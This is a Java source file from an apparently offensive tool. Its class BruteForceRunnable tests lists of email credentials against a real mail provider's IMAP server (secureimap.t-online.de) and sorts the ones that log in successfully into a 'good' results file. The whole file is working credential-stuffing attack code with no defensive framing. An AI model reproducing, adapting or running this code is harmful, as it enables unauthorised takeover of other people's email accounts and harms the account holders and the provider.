package org.bsoftware.parcel.domain.runnables;

import com.chilkatsoft.CkImap;
import lombok.RequiredArgsConstructor;
import org.bsoftware.parcel.domain.callbacks.BruteForceCallback;
import org.bsoftware.parcel.domain.components.DataContainer;
import org.bsoftware.parcel.domain.components.LogView;
import org.bsoftware.parcel.domain.model.DataType;
import org.bsoftware.parcel.domain.model.Source;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.time.temporal.ChronoUnit;

/**
 * BruteForceRunnable is a class that represent worker, which is used for brute-force attack
 *
 * @author Rudolf Barbu
 * @version 0.8.0
 */
@RequiredArgsConstructor
public class BruteForceRunnable implements Runnable
{
    /**
     * Use or not SSL and TLS
     */
    private static final boolean SSL_AND_TLS = Boolean.TRUE;

    /**
     * IMAP server port
     */
    private static final int IMAP_PORT = 993;

    /**
     * IMAP server host link
     */
    private static final String IMAP_SERVER = "secureimap.t-online.de";

    /**
     * Timestamp on thread's start
     */
    private final LocalTime startTime;

    /**
     * Callback interface, which is used to deliver messages to service
     */
    private final BruteForceCallback bruteForceCallback;

    /**
     * Main method of brute-force algorithm
     */
    @Override
    public void run()
    {
        final CkImap ckImap = new CkImap();

        ckImap.put_Ssl(SSL_AND_TLS);
        ckImap.put_StartTls(SSL_AND_TLS);
        ckImap.put_Port(IMAP_PORT);

        Source source;
        while ((source = DataContainer.getNextSource()) != null)
        {
            if (Thread.currentThread().isInterrupted())
            {
                return;
            }

            ckImap.Connect(IMAP_SERVER);
            saveSourceToFile(source, ckImap.Login(source.getCredential(), source.getPassword()));
            bruteForceCallback.decrementCounter(DataType.SOURCE);

            ckImap.Disconnect();
        }
    }

    /**
     * Saving source object to result file
     *
     * @param source - data to save in-to file
     * @param isLogged - Based on this flag, it is decided in which file to save the data
     */
    private synchronized void saveSourceToFile(final Source source, final boolean isLogged)
    {
        final String fileName = isLogged ? "good" : "bad";

        try
        {
            final Path pathToFolder = Paths.get(getClass().getProtectionDomain().getCodeSource().getLocation().toURI()).resolve(String.format("../results [%s]", startTime.truncatedTo(ChronoUnit.SECONDS).format(DateTimeFormatter.ISO_LOCAL_TIME).replace(':', '_')));

            if (!Files.exists(pathToFolder))
            {
                Files.createDirectories(pathToFolder);
            }

            final Path pathToFile = pathToFolder.resolve(String.format("%s.txt", fileName));
            final StandardOpenOption standardOpenOption = Files.exists(pathToFile) ? StandardOpenOption.APPEND : StandardOpenOption.CREATE_NEW;

            Files.write(pathToFile, String.format("%s:%s%n", source.getCredential(), source.getPassword()).getBytes(StandardCharsets.UTF_8), standardOpenOption);
        }
        catch (final URISyntaxException | IOException exception)
        {
            bruteForceCallback.handleBruteForceMessage(LogView.LogLevel.ERROR, String.format("Exception occurred, while saving source to file, clause: %s", exception.getCause().getMessage()));
        }
    }
}